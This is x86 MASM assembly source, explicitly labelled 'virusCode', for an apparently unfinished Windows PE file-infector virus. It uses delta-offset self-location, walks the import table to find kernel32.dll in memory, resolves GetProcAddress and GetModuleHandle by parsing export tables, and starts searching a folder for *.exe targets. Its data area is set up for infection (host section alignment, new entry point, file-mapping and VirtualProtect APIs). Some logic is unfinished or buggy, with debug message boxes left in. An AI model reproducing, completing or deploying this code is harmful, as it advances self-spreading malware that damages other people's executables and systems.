.586
.model flat,stdcall
option casemap:none

   include windows.inc
   include user32.inc
  ; include kernel32.inc
   include masm32.inc
   include masm32rt.inc
   
   includelib user32.lib
  ; includelib kernel32.lib
   includelib masm32.lib
   
.data
FindFirstFileError              BYTE                        "FindFirstFile failed ", 0
FindFirstFileSuccess            BYTE                        "First file found with success ", 0
FindNextFileError               BYTE                        "FindNextFile failed ", 0
FindNextFileSuccess             BYTE                        "FirstNextFile found with success ", 0
FolderFound           		  BYTE                        "Folder found", 0

fileFilter 						db 							"*.*",0
backDir 						db 							"..",0
exeFilter 						db 							"*.exe",0
path 							BYTE 						      "C:\Documents and Settings\F.U.C.K\Desktop\test\",0
count 						db 							0

.data?
validPE						dd							?
hDir 							db 							256 dup (?)
ErrorCode                                 DWORD                       			? 

.code
; ---------------------------------------------------------------------------
virusCode:
	pushad
	pushfd
	call delta
delta: 
	pop ebp
	mov eax,ebp
	sub ebp,delta
	mov [ebp+delta_var],ebp
	invoke MessageBox,NULL, addr FindFirstFileSuccess, addr FolderFound,MB_OK
	call save_imagebase
save_imagebase:
	pop eax
	;and eax,0xFFF00000		            ; ...00000
	mov [ebp+image_base],eax			; save image base
	
scan_import:
	mov esi,[image_base+ebp]			; point on image base
	add eax,3ch						; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
	mov eax,[eax]					; get the value (PE header value)
	add eax,esi						; +image_base (point to PE header)
	add eax,128						; +80H (import directory RVA)
	mov eax,[eax]					; get value at this current eax
	add eax,esi						; now point to import table (+ image_base)
	add eax,12						; +CH (point to .dll)   
	
find_kernel32:
	xor ebx,ebx						; reset ebx
	cmp dword ptr [eax],ebx				; cmp if value tai eax=0
	je end_objecttable				; if= jmp to end_objectable
	call is_it_kernel32				; else check if it is kernel32
	cmp ecx,3						; check if return value=3
	jae find_kernel_image_base			; if return>=3 jmp find kernel32 image base
	add eax,20						; else move to another .dll file
	jmp find_kernel32					; find again
	
find_kernel_image_base:					; go to find kernel in image base
	mov eax,[eax+4]					; point to list API address pointer
	add eax,esi						; + image_base
	mov eax,[eax]					; now eax=address of 1st API from kernel32
	xchg edi,eax					; swap with edi, edi=address of 1st API
	
find_MZ_in_kernel:
	dec edi						; decrease edi
	mov esi,edi						; 
	cmp word ptr [edi],"MZ"				; check MZ
	jne find_MZ_in_kernel				; not found then loop
	
	mov esi,[esi+3CH]					; if ok, move to header relocation then get value
	cmp esi,dword  ptr 200H				; cmp if header reloc=200H
	ja find_MZ_in_kernel				; if >200H jmp then loop
	
	add esi,edi						; go to new header
	cmp word ptr [esi],"PE"				; check PE
	jne find_MZ_in_kernel				; no loop again
	add esi,52						; point to image_base_dword
	
	cmp edi,dword ptr [esi]				; check if edi=image_base 
	jne find_MZ_in_kernel				; loop again
	
	mov esi,edi						; esi=image base of kernel32.dll 
	add esi,3CH						; mov to header relocation
	mov esi,[esi]					; get value
	add esi,edi						; +image base => PE header
	
	add esi,120						; move to export table
	mov esi,[esi]					; get value
	add esi,edi						; +image_base->esi point to the export table !!!
	
find_API:
	push ebp
	call find_ProcAddress
	mov ebx,[esp]
	mov dword ptr [ebx+GetProcAddressAddress],ebp
	pop ebp
	
	push ebp
	call find_GetModuleHandle
	mov ebx,[esp]
	mov dword ptr [ebx+GetModuleHandleAddress],ebp
	pop ebp
	
	push dword ptr[ebp+kernel_string]					; get kernel32 image_base
	call [ebp+GetModuleHandleAddress]				      ; call module handle for image
	mov dword ptr [ebp+handle],eax					; save handle from eax
	
	call GetAPIAddress						      ; now get api address 
	
	;push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
	;push dword 0x80							      ; writeable
	;push dword 0x1000
	;push dword ptr[ebp+image_base]
	;call [ebp+VirtualProtectAddress]
find_first_file:
	push dword ptr [ebp+Win32Data]
	push dword ptr [ebp+search_mask]
	call [ebp+FindFirstFileAAddress]
	mov dword ptr[ebp+search_handle],eax
find_next_file:
	cmp eax,0
	invoke MessageBox, NULL, addr FindFirstFileSuccess , addr FolderFound, MB_OK 
	je done_find
done_find:
	ret
	
GetAPIAddress:
	push dword ptr[ebp+FindFirstFileAStr]
	push dword ptr[ebp+handle]                  ; module handle
	call [ebp+GetProcAddressAddress]
	mov [ebp+FindFirstFileAAddress],eax	
	
	ret
is_it_kernel32: 				; check is it kernel32.dll
	xor ecx,ecx				; reset ecx
	mov ebx,dword ptr [eax]		; set ebx=[eax]
	add ebx,esi				; add image_base
	cmp dword ptr[ebx],"kern"	; cmp with Kern
	jne az1				; if not equal jmp to az1
	inc ecx				; else ecx+=1
case_2:
	cmp dword ptr[ebx],"Kern"
	jne az1
	inc ecx
az1:		
	cmp dword ptr[ebx+4],"el32"	; mov to next 4 bit then cmp with "el32"
	jne az2				; if not jmp to az2
	inc ecx				; else ecx+=1
az1_case_2:
	cmp dword ptr[ebx+4],"EL32"
	jne az2
	inc ecx
az2:	
	cmp dword ptr[ebx+16],".DLL"	;
	jne az3				;
	inc ecx				; else ecx+=1
az2_case_2:
	cmp dword ptr[ebx+16],".dll"
	jne az3
	inc ecx
az3:	
	ret
	
find_ProcAddress:
	xor eax,eax
	xor ecx,ecx
	xor edx,edx
	xor ebp,ebp
	
	inc edx
	mov eax,esi
	mov ebp,esi
	
	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
	add eax,32			; 
	
	mov ebp,[ebp]
	add ebp,edi
	
	mov eax,[eax]
	add eax,edi
	
	mov ebx,eax
	mov eax,[ebx]
	add eax,edi
search_procaddress:
	cmp dword ptr[eax],"GetP"
	je search_procadress_1
back_search_procadress:
	add ebx,4
	inc edx
	mov eax,[ebx]
	add eax,edi
	add ebp,4
	jmp search_procaddress
search_procadress_1:	
	cmp dword ptr[eax+4],"rocA"
	jne back_search_procadress
	inc ecx
search_procadress_2:
	cmp dword ptr[eax+8],"ddre"
	jne back_search_procadress
	inc ecx
search_procadress_3:
	cmp dword ptr[eax+12],"ss"
	jne back_search_procadress
	inc ecx
search_procadress_4:
	mov ebp,[ebp]
	add ebp,edi
	ret
	
find_GetModuleHandle:
	xor eax,eax
	xor ecx,ecx
	xor edx,edx
	xor ebp,ebp
	
	inc edx
	mov eax,esi
	mov ebp,esi
	
	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
	add eax,32			; 
	
	mov ebp,[ebp]
	add ebp,edi
	
	mov eax,[eax]
	add eax,edi
	
	mov ebx,eax
	mov eax,[ebx]
	add eax,edi
search_module:	
	cmp dword ptr[eax],"GetM"
	je search_module_1
back_search_module:
	add ebx,4
	inc edx
	mov eax,[ebx]
	add eax,edi
	add ebp,4
	jmp search_module
search_module_1:
	cmp dword ptr[eax+4],"odul"
	jne back_search_module
	inc ecx
search_module_2:
	cmp dword ptr[eax+8],"eHan"
	jne back_search_module
	inc ecx
search_module_3:
	cmp dword ptr[eax+12],"dleA"
	jne back_search_module
	inc ecx
search_module_4:
	mov ebp,[ebp]
	add ebp,edi
	ret
erreur:	
	

end_objecttable:

image_base    				dd    0h 
kernel_string   		      	db    "kernel32.dll", 0 
search_mask    				db    "C:\Documents and Settings\F.U.C.K\Desktop\test\*.exe", 0 
handle       				dd    0h
GetProc     				dd    0h
file_handle    				dd    0h
GetMod       				dd    0h
delta_var    				dd    0h
map_handle    				dd    0h
file_map_handle    			dd    0h
mem_map_handle    			dd    0h
host_opt_size    				dw    0h
host_no_sect    				dw    0h
host_file_alig   				dd    0h
host_sec_alig    				dd    0h
host_relc_raw    				dd    0h
virtual_out    				dd    0h
search_handle    				dd    0h
host_rel_tab    				dd    0h
host_new_entry    			dd    0h    

Win32Data:
      FileAttributes           	dd 0              ;attributes
      CreationTime             	dd 0,0            ;time of creation
      LastAccessTime           	dd 0,0            ;last access time
      LastWriteTime            	dd 0,0            ;last modification
      FileSizeHigh             	dd 0              ;filesize
      FileSizeLow              	dd 0              ; "
      Reserved0                	dd 0
      Reserved1                	dd 0
      FileName                 	db 260 dup(?)         ;long filename
      AlternateFileName        	db 13  dup(?)         ;short filename

APIName:
	FindFirstFileAStr    		db    "FindFirstFileA", 0 
	FindNextFileAStr    		db    "FindNextFileA", 0 
	CreateFileAStr        		db    "CreateFileA" , 0
	CreateFileMappingStr    	db    "CreateFileMappingA", 0 
	MapViewOfFileStr    		db    "MapViewOfFile", 0 
	GetProcAddressStr    		db    "GetProcAddress" , 0 
	GetModuleHandleAStr    		db    "GetModuleHandleA", 0 
	UnmapViewOfFileStr    		db    "UnmapViewOfFile", 0 
	CloseHandleStr        		db    "CloseHandle", 0 
	VirtualProtectStr    		db    "VirtualProtect", 0
	
APIAddress:
	FindNextFileAAddress    	 	dd    0h
	FindFirstFileAAddress   	 	dd    0h
	CreateFileAAddress       		dd    0h
	CreateFileMappingAAddress   		dd    0h
	MapViewOfFileAAddress 	 		dd    0h
	GetModuleHandleAddress  	 	dd    0h
	GetProcAddressAddress   		dd    0h 
	UnmapViewOfFileAddress   		dd    0h
	CloseHandleAddress        		dd    0h
	VirtualProtectAddress    		dd    0h


end virusCode
